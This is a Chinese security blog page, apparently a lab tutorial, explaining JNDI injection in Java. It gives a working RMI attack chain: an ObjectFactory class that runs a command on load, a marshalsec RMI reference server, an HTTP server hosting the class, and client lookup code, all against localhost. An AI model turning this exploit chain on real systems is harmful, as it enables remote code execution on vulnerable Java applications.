@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>JNDI注入 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="关于JNDI JNDI（Java Naming and Directory Interface）是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用" /><meta name="keywords" content="SSM, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.57.2 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/security/jndi%E6%B3%A8%E5%85%A5/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="JNDI注入" />
+<meta property="og:description" content="关于JNDI JNDI（Java Naming and Directory Interface）是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/security/jndi%E6%B3%A8%E5%85%A5/" />
+<meta property="article:published_time" content="2021-07-04T17:07:36+08:00" />
+<meta property="article:modified_time" content="2021-07-04T17:07:36+08:00" />
+<meta itemprop="name" content="JNDI注入">
+<meta itemprop="description" content="关于JNDI JNDI（Java Naming and Directory Interface）是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用">
+
+
+<meta itemprop="datePublished" content="2021-07-04T17:07:36&#43;08:00" />
+<meta itemprop="dateModified" content="2021-07-04T17:07:36&#43;08:00" />
+<meta itemprop="wordCount" content="1258">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="JNDI注入"/>
+<meta name="twitter:description" content="关于JNDI JNDI（Java Naming and Directory Interface）是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">JNDI注入</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-07-04 </span>
+        <div class="post-category">
+            <a href="/categories/security/"> security </a>
+            </div>
+          <span class="more-meta"> 约 1258 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#关于jndi">关于JNDI</a></li>
+<li><a href="#攻击前准备">攻击前准备</a></li>
+<li><a href="#rmi攻击方式">RMI攻击方式</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h2 id="关于jndi">关于JNDI</h2>
+
+<p>JNDI（Java Naming and Directory Interface）是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源，比如可以利用JNDI定位一个远程Java对象或者一个数据库服务等。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用；</p>
+
+<p>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在 <strong>客户端</strong> 的 <code>lookup()</code> 函数中，如果 <code>lookup()</code> 的参数可控就可能被攻击；</p>
+
+<h2 id="攻击前准备">攻击前准备</h2>
+
+<ul>
+<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
+<li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
+<li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
+</ul>
+
+<h2 id="rmi攻击方式">RMI攻击方式</h2>
+
+<p>此种攻击方式主要是通过RMI进行JNDI注入，攻击者可以通过构造一个而已的RMI服务向客户端（靶机）返回一个恶意的 <code>Referer</code> 对象，然后客户端（靶机）会通过这个恶意的 <code>Referer</code> 对象加载其中指定的 <code>Factory</code> 并实例化，如果我们精心构造一个恶意的 <code>Factory</code> ，那么就可以导致客户端（靶机）执行任意恶意代码。</p>
+
+<p><code>javax.naming.Reference</code> 通过如下方式指定被加载的 <code>Factory</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Reference reference = new Reference(&#34;TargetClassName&#34;, &#34;FactoryName&#34;, &#34;your_eval_urlcodebase&#34;);</pre></td></tr></table>
+</div>
+</div>
+<p>例如如下是一个恶意的 <code>Factory</code> 对象类定义，注意需要实现 <code>ObjectFactory</code> 接口，且不能指定 <code>package</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">/**
+ * @author : p1n93r
+ * @date : 2021/7/5 0:18
+ */
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
+
+public class Exploit implements ObjectFactory {
+    static {
+        exec(&#34;calc&#34;);
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {
+        return null;
+    }
+
+    public static String exec(String cmd) {
+        try {
+            Runtime.getRuntime().exec(cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+
+    public static void main(String[] args) {
+        exec(&#34;calc&#34;);
+    }
+}</pre></td></tr></table>
+</div>
+</div>
+<p>将此类编译后，得到 <code>Exploit.class</code> 文件，然后通过 <code>marshallsec</code> 开启一个 <code>RMI Referer</code> 服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:4578/#Exploit&#34; 1088</pre></td></tr></table>
+</div>
+</div>
+<p>同时起一个HTTP服务用于返回恶意的 <code>Factory</code> 对象（需要将前面得到的Exploit.class放在WEB根目录下）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">python3 -m http.server 4578
+// or
+python2 -m SimpleHTTPServer 4578</pre></td></tr></table>
+</div>
+</div>
+<p>然后通过操作客户端的 <code>lookup()</code> 函数的入参为我们的恶意RMI服务地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">// 为了方便调试，直接开启urlcodebase
+System.setProperty(&#34;java.rmi.server.useCodebaseOnly&#34;, &#34;false&#34;);
+System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
+System.setProperty(&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;, &#34;true&#34;);
+// 准备进行RMI方式的JNDI注入了
+String uri = &#34;rmi://127.0.0.1:1088/Exploit&#34;;
+Context ctx = new InitialContext();
+ctx.lookup(uri);</pre></td></tr></table>
+</div>
+</div>
+<p>如下图所示，成功弹出计算器：</p>
+
+<p><img src="./../media/2021-07-05-01.png" alt="" /></p>
+
+<p>以下给出调用栈：</p>
+
+<p><img src="./../media/2021-07-05-02.png" alt="" /></p>
+
+<h2 id="参考资料">参考资料</h2>
+
+<ul>
+<li><a href="https://www.redteaming.top/2020/08/24/JNDI-Injection/">JNDI注入学习</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">浅析JNDI</a></li>
+<li><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016回顾之JNDI注入</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-07-04
+        
+    </span>
+  </p>
+  
+  
+</div>
+<div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/pay/wechat.jpg">
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/pay/alipay.jpg">
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div><footer class="post-footer">
+      
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/security/apache_dubbo_cve-2020-1948%E5%88%86%E6%9E%90/">
+            <span class="next-text nav-default">Apache_Dubbo_CVE-2020-1948分析</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">P1n93r</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
